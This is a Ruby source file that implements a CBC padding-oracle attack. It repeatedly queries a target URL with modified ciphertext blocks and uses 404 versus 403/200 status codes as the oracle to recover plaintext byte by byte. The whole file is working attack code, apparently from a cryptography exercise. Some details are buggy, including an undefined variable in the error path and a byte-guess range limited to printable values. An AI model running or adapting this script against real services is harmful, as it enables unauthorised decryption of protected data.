require 'open-uri'

class PaddingOracleHacker
  attr_accessor :known

  def initialize(query_url, ciphertext)
    @ciphertext = ciphertext
    @query_url = query_url
    @tester = PaddingOracleTester.new(query_url)
    @known = []
  end

  def blocks
    @blocks ||= ciphertext.scan(/.{32}/)
  end

  # TODO: move to tester
  def has_a_valid_pad?(test_cipher)
    case tester.query_target(test_cipher)
    when '403', '200'
      false
    when '404'
      true
    else
      raise "tester returned bad value from site: #{status}"
    end
  end

  def discover_pad
    (1..16).each do |guess|
      if has_a_valid_pad? generate_guess(-1, pad: 1, byte_guess: guess)
        guess.times { known.unshift guess }
        break
      end
    end
  end

  def decrypt
    decrypt_block(-1)
    (1..blocks.size-2).each do |n|
      delegated_hacker = self.class.new(query_url, ciphertext[0..-((32*n) + 1)])
      delegated_hacker.decrypt_block(-1)
      known.unshift delegated_hacker.known
      known.flatten!
    end
    known.pack('C*')
  end

  def decrypt_block(block_number)
    discover_pad if block_number == -1
    initial_pad = (known.size + 1) - (16 * -(block_number + 1))
    (initial_pad..16).each do |pad|
      puts "trying pad: #{pad}"
      (32..175).each do |guess|
        raise "no valid pad found" if guess == 256
        test_cipher = generate_guess(block_number, pad: pad, byte_guess: guess)
        if has_a_valid_pad?(test_cipher)
          known.unshift guess
          break
        end
      end
      puts "known: #{known}"
      puts "known_for_human: #{known.pack('C*')}"
    end
  end

  def generate_guess(block_number=-1, pad: 1, byte_guess: 0)
    cloned_blocks = clone_blocks(blocks[0..block_number])

    (1..pad).each do |n|
      guess = (n == pad) ? byte_guess : known[-n + (16 * (block_number+1))] 
      index = -(2 * n)
      previous_block_hex_byte = blocks[-2][index..index+1]
      new_last_byte = (pad ^ guess ^ previous_block_hex_byte.hex)
      new_last_hex_byte = [new_last_byte].pack('C*').unpack('H*').first
      cloned_blocks[-2][index..index+1] = new_last_hex_byte
    end
    cloned_blocks.join
  end

  private
  attr_reader :ciphertext, :tester, :query_url

  def clone_blocks(blocks_to_clone=blocks)
    blocks_to_clone.map { |block| block.dup }
  end

  def plain_text_deciphered?
    false
  end
end

class PaddingOracleTester
  def initialize(base_url)
    @base_url = base_url
  end

  def query_target(ciphertext)
    response = open base_url + ciphertext
    response.status.first
  rescue OpenURI::HTTPError => error
    status_code_for error.message
  end

  private
  attr_reader :base_url

  def status_code_for(error_message)
    error_message[0..2]
  end
end
